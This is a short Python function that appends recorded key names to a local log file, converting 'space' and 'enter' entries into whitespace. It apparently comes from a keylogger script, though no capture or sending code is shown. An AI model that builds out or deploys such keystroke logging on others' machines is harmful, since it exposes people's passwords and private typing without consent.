def write_file(keys, log_file_name="log.txt", mode="a"):
    with open(log_file_name, mode) as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write("\n")
            else:
                f.write(k)
